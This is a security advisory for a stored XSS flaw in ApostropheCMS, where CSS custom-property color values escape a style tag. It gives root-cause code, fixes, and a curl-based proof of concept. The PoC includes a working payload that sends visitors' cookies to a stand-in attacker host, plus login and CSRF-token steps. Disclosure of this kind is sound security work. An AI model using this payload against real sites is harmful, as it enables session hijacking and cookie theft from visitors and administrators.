# [M] ApostropheCMS: Stored XSS via CSS Custom Property Injection in @apostrophecms/color-field Escaping Style Tag Context

## Summary
Severity: Medium
Advisory: GHSA-97v6-998m-fp4g
CVE: CVE-2026-33889
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-97v6-998m-fp4g
Type: github-advisory

## Affected
- npm: `apostrophe` — affected >=0 <4.29.0

## Details
## Summary

The `@apostrophecms/color-field` module bypasses color validation for values prefixed with `--` (intended for CSS custom properties), but performs no HTML sanitization on these values. When styles containing attacker-controlled color values are rendered into `<style>` tags — both in the global stylesheet (editors only) and in per-widget style elements (all visitors) — the lack of escaping allows an editor to inject `</style>` followed by arbitrary HTML/JavaScript, achieving stored XSS against all site visitors.

## Details

**Root Cause 1: Validation bypass in color field** (`modules/@apostrophecms/color-field/index.js:36`)

The color field's `convert` method uses TinyColor to validate color values, but exempts any value starting with `--`:

```javascript
// modules/@apostrophecms/color-field/index.js:26-38
async convert(req, field, data, destination) {
  destination[field.name] = self.apos.launder.string(data[field.name]);
  // ...
  const test = new TinyColor(destination[field.name]);
  if (!test.isValid && !destination[field.name].startsWith('--')) {
    destination[field.name] = null;
  }
},
```

A value like `--x: red}</style><script>alert(document.cookie)</script><style>` passes validation because it starts with `--`. The `launder.string()` call performs type coercion only — it does not strip HTML metacharacters like `<`, `>`, or `/`.

**Root Cause 2a: Unescaped rendering in widget styles (public path)** (`modules/@apostrophecms/styles/lib/methods.js:232-234`)

The `getWidgetElements()` method concatenates the CSS string directly into a `<style>` tag:

```javascript
// modules/@apostrophecms/styles/lib/methods.js:232-234
return `<style data-apos-widget-style-for="${widgetId}" data-apos-widget-style-id="${styleId}">\n` +
  css +
  '\n</style>';
```

This is then marked as safe HTML via `template.safe()` in the helpers (`modules/@apostrophecms/styles/lib/helpers.js:17-20`), and rendered for **all visitors** on any page containing a styled widget (`modules/@apostrophecms/widget-type/index.js:426-432`).

**Root Cause 2b: Unescaped rendering in global stylesheet (editor path)** (`modules/@apostrophecms/template/index.js:1164-1165`)

The `renderNodes()` function returns `node.raw` without escaping:

```javascript
// modules/@apostrophecms/template/index.js:1164-1165
if (node.raw != null) {
  return node.raw;
}
```

Style nodes containing the malicious color values are rendered as raw HTML, affecting editors and admins who can `view-draft`.

## PoC

**Prerequisites:** An account with `editor` role on an Apostrophe 4.x instance. The site must have at least one piece or page type with a color field used in styles configuration.

**Step 1: Authenticate and obtain a CSRF token and session cookie.**

```bash
# Login as editor
COOKIE_JAR=$(mktemp)
curl -s -c "$COOKIE_JAR" -X POST http://localhost:3000/api/v1/@apostrophecms/login/login \
  -H "Content-Type: application/json" \
  -d '{"username":"editor","password":"editor123"}'

# Extract CSRF token
CSRF=$(curl -s -b "$COOKIE_JAR" http://localhost:3000/api/v1/@apostrophecms/i18n/locale/en | grep -o '"csrfToken":"[^"]*"' | cut -d'"' -f4)
```

**Step 2: Create or update a piece/page with a malicious color value in a styled widget.**

The exact API route depends on the site's widget configuration. For a widget type that uses a color field in its styles schema (e.g., a `background-color` style property):

```bash
# Inject XSS payload via color field in widget styles
# The --x prefix bypasses TinyColor validation
PAYLOAD='--x: red}</style><img src=x onerror="fetch(`https://attacker.example/steal?c=`+document.cookie)"><style>'

curl -s -b "$COOKIE_JAR" -X POST \
  "http://localhost:3000/api/v1/@apostrophecms/page" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $CSRF" \
  -d '{
    "slug": "/xss-test",
    "title": "Test Page",
    "type": "default-page",
    "main": {
      "items": [{
        "type": "some-widget",
        "styles": {
          "backgroundColor": "'"$PAYLOAD"'"
        }
      }]
    }
  }'
```

**Step 3: Publish the page.**

```bash
curl -s -b "$COOKIE_JAR" -X POST \
  "http://localhost:3000/api/v1/@apostrophecms/page/{pageId}/publish" \
  -H "X-XSRF-TOKEN: $CSRF"
```

**Step 4: Any visitor navigates to the published page.**

```bash
# As an unauthenticated visitor
curl -s http://localhost:3000/xss-test | grep -A2 'onerror'
```

**Expected (safe):** The color value is escaped or rejected.

**Actual:** The rendered HTML contains:

```html
<style data-apos-widget-style-for="..." data-apos-widget-style-id="...">
.apos-widget-style-... { background-color: --x: red}</style><img src=x onerror="fetch(`https://attacker.example/steal?c=`+document.cookie)"><style>; }
</style>
```

The injected `</style>` closes the style tag, and the `<img onerror>` executes JavaScript in the visitor's browser.

## Impact

- **Stored XSS on public pages (Path B):** An editor can inject JavaScript that executes for **every visitor** to any page containing the affected widget. This enables mass cookie theft, session hijacking, keylogging, phishing overlays, and drive-by malware delivery against the site's entire audience.
- **Privilege escalation (Path A):** An editor can steal admin session tokens from higher-privileged users viewing draft content, escalating to full administrative control of the CMS.
- **Persistence:** The payload is stored in the database and survives restarts. It executes on every page load until the content is manually edited.
- **No CSP mitigation:** Apostrophe does not enforce a strict Content-Security-Policy by default, so inline script execution is not blocked.

## Recommended Fix

**Fix 1: Sanitize color values in the color field's `convert` method** (`modules/@apostrophecms/color-field/index.js`):

```javascript
// Before (line 36):
if (!test.isValid && !destination[field.name].startsWith('--')) {
  destination[field.name] = null;
}

// After:
if (!test.isValid && !destination[field.name].startsWith('--')) {
  destination[field.name] = null;
} else if (destination[field.name].startsWith('--')) {
  // CSS custom property names: only allow alphanumeric, hyphens, underscores
  if (!/^--[a-zA-Z0-9_-]+$/.test(destination[field.name])) {
    destination[field.name] = null;
  }
}
```

**Fix 2: Escape CSS output in `getWidgetElements`** (`modules/@apostrophecms/styles/lib/methods.js`):

```javascript
// Before (line 232-234):
return `<style data-apos-widget-style-for="${widgetId}" data-apos-widget-style-id="${styleId}">\n` +
  css +
  '\n</style>';

// After:
const sanitizedCss = css.replace(/<\//g, '<\\/');
return `<style data-apos-widget-style-for="${widgetId}" data-apos-widget-style-id="${styleId}">\n` +
  sanitizedCss +
  '\n</style>';
```

Both fixes should be applied: Fix 1 provides input validation (defense in depth at the data layer), and Fix 2 provides output encoding (preventing style tag breakout regardless of the input source).

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-97v6-998m-fp4g
- https://nvd.nist.gov/vuln/detail/CVE-2026-33889
- https://github.com/apostrophecms/apostrophe/commit/6a89bdb7acdb2e1e9bf1429961a6ba7f99410481
- https://github.com/apostrophecms/apostrophe
